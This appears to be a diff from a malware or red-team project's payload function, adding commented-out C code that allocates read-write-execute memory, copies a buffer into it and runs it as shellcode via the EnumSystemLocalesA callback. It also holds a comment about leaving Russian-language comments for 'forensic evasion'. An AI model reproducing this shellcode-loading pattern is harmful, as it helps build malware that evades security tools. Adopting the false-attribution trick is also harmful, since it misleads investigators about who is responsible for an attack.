@@ -175,5 +175,22 @@ int payload () {
 // Shellcode executes as a locale enumeration callback
 //EnumSystemLocalesA((LOCALE_ENUMPROCA)mem, LCID_INSTALLED);
 
+//replace 147 to 159 with this. Super Excited as I may have figured this out!!!
+//		LPVOID mem = VirtualAlloc(
+//			0,
+//			buffer.size() + 1,
+//			MEM_COMMIT | MEM_RESERVE,
+//			PAGE_EXECUTE_READWRITE);
+
+	
+//		memcpy(
+//			mem,
+//			buffer.data(),
+//			buffer.size());
+
+//		EnumSystemLocalesA((LOCALE_ENUMPROCA)mem, LCID_INSTALLED);
+	
+
+
 //Это мой проект
 //Leave Russian Comments for Forensic Evasion
